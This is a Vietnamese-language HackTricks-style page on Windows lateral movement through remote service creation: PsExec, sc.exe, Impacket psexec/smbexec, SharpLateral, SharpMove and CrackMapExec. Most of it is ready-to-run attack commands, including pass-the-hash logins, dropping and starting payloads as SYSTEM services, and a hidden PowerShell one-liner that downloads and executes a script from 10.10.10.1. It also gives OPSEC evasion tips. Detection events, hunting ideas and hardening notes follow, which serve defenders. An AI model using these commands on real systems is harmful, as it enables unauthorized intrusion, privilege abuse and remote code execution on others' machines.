# Thực thi dịch vụ từ xa (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## Cách chúng hoạt động

Các kỹ thuật này lạm dụng Windows Service Control Manager (SCM) từ xa qua SMB/RPC để thực thi lệnh trên máy chủ mục tiêu. Service Control Manager Remote Protocol (SCMR) là giao diện dựa trên RPC để cấu hình và điều khiển các dịch vụ Windows trên máy tính từ xa. Với đủ quyền, operator có thể tạo hoặc cấu hình lại một dịch vụ có đường dẫn binary chứa lệnh, rồi khởi chạy dịch vụ đó để thực thi lệnh từ xa.<sup>[[5]](#references)</sup> Quy trình phổ biến gồm:

1. Xác thực với mục tiêu qua SMB/RPC (TCP/445); truy cập share ADMIN$ nếu biến thể được chọn cần đưa file lên hoặc lấy output từ đó.
2. Sao chép một executable hoặc chỉ định dòng lệnh LOLBAS để dịch vụ chạy.
3. Tạo dịch vụ từ xa qua SCM (MS-SCMR qua \PIPE\svcctl), trỏ đến lệnh hoặc binary đó.
4. Khởi chạy dịch vụ để thực thi payload và tùy chọn thu thập stdin/stdout qua named pipe.
5. Dừng dịch vụ và dọn dẹp (xóa dịch vụ cùng mọi binary đã thả xuống).

Yêu cầu/điều kiện tiên quyết:
- Có quyền Local Administrator trên mục tiêu (SeCreateServicePrivilege) hoặc có quyền tạo dịch vụ tường minh trên mục tiêu.
- SMB (445) có thể truy cập và Remote Service Management được cho phép qua firewall của máy chủ; ADMIN$ phải khả dụng với các biến thể cần dùng share này để đưa file lên hoặc lấy output.
- UAC Remote Restrictions: với tài khoản cục bộ, việc lọc token có thể chặn quyền admin qua mạng, trừ khi sử dụng tài khoản Administrator tích hợp sẵn hoặc đặt LocalAccountTokenFilterPolicy=1.
- Kerberos và NTLM: dùng hostname/FQDN sẽ bật Kerberos; kết nối bằng IP thường sẽ chuyển sang NTLM (và có thể bị chặn trong môi trường được hardening).

Nếu không chỉ định tài khoản dịch vụ, `CreateService` sẽ sử dụng `LocalSystem`, tài khoản này có nhiều quyền cục bộ. Điều này lý giải mức độ ảnh hưởng cao khi thực thi SCM thành công. Cơ chế này không tự vô hiệu hóa UAC hay Microsoft Defender: bên gọi vẫn cần có quyền SCM từ xa, và các biện pháp kiểm soát endpoint có thể kiểm tra hoặc chặn dịch vụ hay payload.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### ScExec/WinExec thủ công qua sc.exe

Phần sau trình bày cách tạo dịch vụ tối giản. Image của dịch vụ có thể là một EXE được thả xuống hoặc một LOLBAS như cmd.exe hay powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Ghi chú:
- Dự kiến gặp lỗi timeout khi khởi chạy EXE không phải service; quá trình thực thi vẫn diễn ra.
- Để thân thiện hơn với OPSEC, ưu tiên các lệnh fileless (`cmd /c`, `powershell -enc`) hoặc xóa các artifact đã thả xuống.

Tìm các bước chi tiết hơn tại: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Công cụ và ví dụ

### Sysinternals PsExec.exe

- Công cụ quản trị kinh điển sử dụng SMB để thả PSEXESVC.exe vào ADMIN$, cài đặt một service tạm thời (tên mặc định là PSEXESVC) và chuyển tiếp I/O qua named pipes.
- Ví dụ sử dụng:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Bạn có thể khởi chạy trực tiếp từ Sysinternals Live qua WebDAV:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Để lại các sự kiện cài đặt/gỡ cài đặt service (tên service thường là PSEXESVC trừ khi dùng -r) và tạo C:\Windows\PSEXESVC.exe trong quá trình thực thi.

### Impacket psexec.py (tương tự PsExec)

- Sử dụng service kiểu RemCom được nhúng sẵn. Thả một binary service tạm thời (thường có tên ngẫu nhiên) qua ADMIN$, tạo một service (mặc định thường là RemComSvc) và proxy I/O qua một named pipe.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Trên Kali, các ví dụ của Impacket có thể nằm trong `/usr/share/doc/python3-impacket/examples/`. Nếu không cung cấp mật khẩu, công cụ sẽ yêu cầu nhập mật khẩu. Tùy chọn `-k` của Impacket yêu cầu xác thực Kerberos thay vì NTLM, thường sử dụng bộ nhớ đệm thông tin xác thực hiện tại hoặc thông tin xác thực được cung cấp.

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

Dấu vết
- EXE tạm thời trong C:\Windows\ (8 ký tự ngẫu nhiên). Tên service mặc định là RemComSvc, trừ khi được ghi đè.

### Impacket smbexec.py (SMBExec)

- Tạo một service tạm thời để khởi chạy cmd.exe và dùng named pipe cho I/O. Thường không cần thả payload EXE đầy đủ; việc thực thi lệnh có tính tương tác bán phần.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) triển khai một số phương thức di chuyển ngang, bao gồm service-based exec.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) hỗ trợ thực thi từ xa có xác thực thông qua SCM và một số cơ chế Windows khác, bao gồm sửa đổi/tạo dịch vụ.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Bạn cũng có thể dùng CrackMapExec để thực thi thông qua các backend khác nhau (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SCMExec với SharpMove

Hành động SCM tạo một service có tên `WindowsDebug` và trỏ service này đến payload đã có sẵn trên host từ xa.<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC, phát hiện và dấu vết

Các dấu vết thường gặp trên máy chủ/mạng khi sử dụng kỹ thuật kiểu PsExec:
- Security 4624 (Logon Type 3) và 4672 (Special Privileges) trên máy đích cho tài khoản admin được sử dụng.
- Các sự kiện Security 5140/5145 File Share và File Share Detailed cho thấy truy cập ADMIN$ và tạo/ghi các tệp binary dịch vụ (ví dụ: PSEXESVC.exe hoặc .exe ngẫu nhiên gồm 8 ký tự).
- **System** 7045 từ Service Control Manager khi cài đặt dịch vụ trên máy đích: các tên như PSEXESVC, RemComSvc hoặc tên tùy chỉnh (`-r` / `-service-name`). Sự kiện này chứng minh dịch vụ đã được cài đặt, không chứng minh image của dịch vụ đã chạy. Đối chiếu dấu thời gian và đường dẫn image với sự kiện tiến trình hoặc mục prefetch tương ứng với image dịch vụ, nếu có.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) cho services.exe hoặc image dịch vụ, 3 (Network Connect), 11 (File Create) trong C:\Windows\, 17/18 (Pipe Created/Connected) cho các pipe như \\.\pipe\psexesvc, \\.\pipe\remcom_* hoặc các tên tương đương được tạo ngẫu nhiên.
- Dấu vết Registry của EULA Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 trên máy của operator (nếu không bị tắt).

Ý tưởng săn tìm
- Cảnh báo khi cài đặt dịch vụ có ImagePath chứa cmd.exe /c, powershell.exe hoặc các vị trí TEMP.
- Tìm các lần tạo tiến trình có ParentImage là C:\Windows\PSEXESVC.exe hoặc tiến trình con của services.exe chạy với quyền LOCAL SYSTEM để thực thi shell.
- Đánh dấu các named pipe có tên kết thúc bằng -stdin/-stdout/-stderr hoặc tên pipe quen thuộc của các bản sao PsExec.

## Khắc phục các lỗi thường gặp
- Access is denied (5) khi tạo dịch vụ: tài khoản không thực sự là admin cục bộ, giới hạn UAC từ xa đối với tài khoản cục bộ hoặc tính năng chống can thiệp của EDR trên đường dẫn binary dịch vụ.
- The network path was not found (53) hoặc không thể kết nối tới ADMIN$: firewall chặn SMB/RPC hoặc các admin share đã bị tắt.
- Kerberos thất bại nhưng NTLM bị chặn: kết nối bằng hostname/FQDN (không dùng IP), đảm bảo SPN phù hợp hoặc cung cấp -k/-no-pass cùng tickets khi dùng Impacket.
- Dịch vụ hết thời gian chờ khi khởi động nhưng payload đã chạy: điều này có thể xảy ra nếu không dùng binary dịch vụ thật; ghi output vào tệp hoặc dùng smbexec để có I/O trực tiếp.

## Lưu ý về hardening
- Windows 11 24H2 và Windows Server 2025 mặc định yêu cầu SMB signing cho kết nối đi (và kết nối đến trên Windows 11). Điều này không ảnh hưởng đến việc sử dụng PsExec hợp lệ với thông tin xác thực hợp lệ, nhưng ngăn chặn lạm dụng SMB relay không ký và có thể ảnh hưởng đến các thiết bị không hỗ trợ signing.<sup>[[2]](#references)</sup>
- Tính năng chặn NTLM mới của SMB client (Windows 11 24H2/Server 2025) có thể ngăn fallback sang NTLM khi kết nối bằng IP hoặc đến máy chủ không dùng Kerberos. Trong môi trường đã harden, điều này sẽ làm hỏng PsExec/SMBExec dựa trên NTLM; hãy dùng Kerberos (hostname/FQDN) hoặc cấu hình ngoại lệ nếu thực sự cần.<sup>[[2]](#references)</sup>
- Nguyên tắc đặc quyền tối thiểu: giảm số thành viên trong nhóm admin cục bộ, ưu tiên Just-in-Time/Just-Enough Admin, triển khai LAPS và giám sát/cảnh báo khi cài đặt dịch vụ 7045.

## Xem thêm

- Thực thi từ xa dựa trên WMI (thường ít để lại tệp hơn):

{{#ref}}
./wmiexec.md
{{#endref}}

- Thực thi từ xa dựa trên WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Tăng cường bảo mật SMB trong Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Dùng thông tin xác thực để chiếm quyền các máy Windows - Phần 2 (PSExec và dịch vụ)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Khắc phục sự cố khởi động lại bất ngờ bằng nhật ký sự kiện hệ thống](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Microsoft Open Specifications - Tổng quan về giao thức từ xa Service Control Manager](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn - Tài khoản LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn - Hàm `CreateService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
